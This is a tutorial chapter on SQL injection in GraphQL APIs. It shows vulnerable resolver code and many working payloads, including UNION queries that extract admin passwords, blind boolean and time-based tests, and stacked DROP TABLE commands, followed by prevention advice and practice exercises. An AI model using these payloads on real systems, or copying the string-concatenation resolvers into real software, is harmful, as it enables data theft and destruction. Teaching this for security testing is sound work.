# 17 - GraphQL SQL Injection

## Overview

GraphQL APIs often translate queries into SQL. When resolvers construct SQL queries dynamically from GraphQL arguments, injection vulnerabilities emerge. This guide covers how to identify and exploit SQL injection in GraphQL contexts.

## Understanding GraphQL Injection

GraphQL provides a flexible query language for APIs, but the flexibility can introduce vulnerabilities when backend resolvers dynamically build SQL queries from user input.

### How GraphQL Translates to SQL

| Component         | Action            | Risk                     |
| ----------------- | ----------------- | ------------------------ |
| GraphQL Query     | Sent by client    | User-controlled input    |
| Resolver Function | Processes query   | **Injection Point Here** |
| SQL Query         | Dynamically built | Vulnerable to injection  |
| Database          | Executes query    | Data breach risk         |

### Common Vulnerable Patterns

**Example 1: Direct Argument Concatenation**

```javascript
// Vulnerable resolver
const resolvers = {
  Query: {
    user: (parent, args, context) => {
      const query = `SELECT * FROM users WHERE id = ${args.id}`
      return db.query(query)
    }
  }
}
```

**GraphQL Query:**

```graphql
query {
  user(id: "1 OR 1=1") {
    name
    email
  }
}
```

**Resulting SQL:**

```sql
SELECT * FROM users WHERE id = 1 OR 1=1
```

**Example 2: Filter Manipulation**

```javascript
// Vulnerable filter handling
const resolvers = {
  Query: {
    users: (parent, { filter }, context) => {
      let query = 'SELECT * FROM users'
      if (filter) {
        query += ` WHERE ${filter}`
      }
      return db.query(query)
    }
  }
}
```

**GraphQL Query:**

```graphql
query {
  users(filter: "1=1 UNION SELECT * FROM admin") {
    name
  }
}
```

## GraphQL-Specific Injection Vectors

### Vector 1: Variables in Fragments

```graphql
query GetUser($id: ID!) {
  user(id: $id) {
    ...UserFields
  }
}

fragment UserFields on User {
  name
  email
}
```

**Variable Injection:**

```json
{
  "id": "1' UNION SELECT * FROM admin--"
}
```

**Result:**

```sql
SELECT * FROM users WHERE id = '1' UNION SELECT * FROM admin--'
```

### Vector 2: Directive Arguments

```graphql
query {
  users @include(if: true) {
    name
  }
}
```

**Note:** Directives themselves are usually safe, but arguments passed to underlying resolvers may be vulnerable.

### Vector 3: Input Object Injection

```graphql
query {
  users(where: { name: "admin'--", status: "active" }) {
    name
  }
}
```

**Backend Processing:**

```javascript
// Vulnerable: Building WHERE clause from object
let whereClause = Object.entries(args.where)
  .map(([key, value]) => `${key} = '${value}'`)
  .join(' AND ')
```

**Result:**

```sql
SELECT * FROM users WHERE name = 'admin'--' AND status = 'active'
```

### Vector 4: Nested Object Injection

```graphql
query {
  search(criteria: { profile: { bio: "'; DROP TABLE users;--" } }) {
    results
  }
}
```

## Detection in GraphQL

### Step 1: Introspection Query

```graphql
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

**What to look for:**

- Arguments that become SQL WHERE clauses
- Filter/search parameters
- Raw query strings
- Sort/order parameters

### Step 2: Test Arguments

**Quote Injection:**

```graphql
query {
  user(id: "'") {
    name
  }
}
```

**Boolean Tests:**

```graphql
query {
  user(id: "1 AND 1=1") {
    name
  }
}

query {
  user(id: "1 AND 1=2") {
    name
  }
}
```

**Union Tests:**

```graphql
query {
  user(id: "1 UNION SELECT 1,2,3") {
    name
  }
}
```

### Step 3: Error Analysis

**Error Messages Leak Information:**

```
"Unknown column 'xyz' in 'field list'"
→ MySQL error, column enumeration possible

"syntax error at or near 'UNION'"
→ PostgreSQL, UNION injection possible
```

## Exploitation Techniques

### Technique 1: Classic Union Injection

```graphql
query {
  user(id: "1 UNION SELECT username,password FROM admin--") {
    name
  }
}
```

**Backend Query:**

```sql
SELECT name FROM users WHERE id = 1
UNION SELECT username,password FROM admin--'
```

### Technique 2: Boolean-Based Blind

```graphql
query {
  users(filter: "1=1 AND (SELECT SUBSTRING(password,1,1) FROM admin LIMIT 1)='a'") {
    name
  }
}
```

**Detection:**

- True condition: Results returned
- False condition: Empty results

### Technique 3: Time-Based Blind

```graphql
query {
  user(id: "1 AND (SELECT pg_sleep(5)) IS NULL") {
    name
  }
}
```

### Technique 4: Stacked Queries via Mutations

```graphql
mutation {
  updateUser(id: "1'; DROP TABLE logs;--", name: "test") {
    success
  }
}
```

**Result:**

```sql
UPDATE users SET name = 'test' WHERE id = '1'; DROP TABLE logs;--'
```

### Technique 5: Order By Injection

```javascript
// Vulnerable resolver
User.findAll({
  order: [['name', req.query.order]]
})
```

**Attack:**

```graphql
query {
  users(order: "(SELECT pg_sleep(5))") {
    name
  }
}
```

**Result:**

```sql
ORDER BY name (SELECT pg_sleep(5))
```

## Advanced GraphQL Injection

### Nested Query Injection

```graphql
query {
  posts {
    author {
      profile(where: { bio: "' OR 1=1--" }) {
        bio
      }
    }
  }
}
```

### Batch Request Injection

```graphql
[
  {
    query: "query { user(id: \"1\") { name } }"
  },
  {
    query: "query { user(id: \"' UNION SELECT * FROM admin--\") { name } }"
  }
]
```

### Fragment Injection

```graphql
query {
  user(id: "1") {
    ...UserFragment
  }
}

fragment UserFragment on User {
  name
  email
  # Additional fields injected via resolver
}
```

## Prevention for GraphQL

### Use ORM or Query Builders

```javascript
// Secure with parameterized queries
const resolvers = {
  Query: {
    user: (parent, args, context) => {
      return db.query('SELECT * FROM users WHERE id = ?', [args.id])
    }
  }
}
```

### Input Validation

```javascript
const { Int } = require('graphql-scalars')

const resolvers = {
  Query: {
    user: (parent, args) => {
      // Validate ID is actually an integer
      if (!Number.isInteger(parseInt(args.id))) {
        throw new Error('Invalid ID format')
      }
      // ... parameterized query
    }
  }
}
```

### Use GraphQL Scalars

```javascript
const { GraphQLScalarType } = require('graphql')

const PositiveInt = new GraphQLScalarType({
  name: 'PositiveInt',
  serialize: value => value,
  parseValue: value => {
    if (!Number.isInteger(value) || value <= 0) {
      throw new Error('Must be positive integer')
    }
    return value
  }
})
```

### Query Complexity Analysis

```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity')

const rules = [
  createComplexityLimitRule(1000, {
    onComplete: complexity => {
      console.log('Query complexity:', complexity)
    }
  })
]
```

### Disable Introspection in Production

```javascript
const { NoSchemaIntrospectionCustomRule } = require('graphql')

const server = new ApolloServer({
  typeDefs,
  resolvers,
  validationRules: [NoSchemaIntrospectionCustomRule]
})
```

## Practice Exercises

### Exercise 1: Basic GraphQL Injection

**Setup:**

- GraphQL endpoint: `/graphql`
- Query with user lookup by ID

**Task:**

1. Send introspection query to understand schema
2. Test for SQL injection in user query
3. Extract admin password using UNION

**Payload:**

```graphql
query {
  user(id: "1 UNION SELECT username,password FROM admin") {
    name
  }
}
```

### Exercise 2: Filter Injection

**Setup:**

- GraphQL search with filter parameter

**Task:**

1. Inject into filter parameter
2. Bypass search restrictions
3. Extract sensitive data

**Payload:**

```graphql
query {
  search(filter: "1=1 UNION SELECT * FROM secret_data") {
    results
  }
}
```

### Exercise 3: Boolean Blind in GraphQL

**Setup:**

- Blind SQL injection in GraphQL user lookup

**Task:**

1. Confirm injection with boolean tests
2. Extract data character by character
3. Automate with script

**Payload:**

```graphql
query {
  user(id: "1 AND (SELECT SUBSTRING(password,1,1) FROM admin)='a'") {
    name
  }
}
```

## Key Takeaways

1. **GraphQL adds abstraction layer** but SQL injection still possible
2. **Resolvers are the injection point** - not the GraphQL layer itself
3. **Variables and fragments** can both carry injection payloads
4. **Input validation** must happen at resolver level
5. **ORM/parameterized queries** prevent injection in resolvers

## Next Step

Continue to [18 - ORM Injection](18-ORM-Injection.md) to learn about ORM bypass techniques.
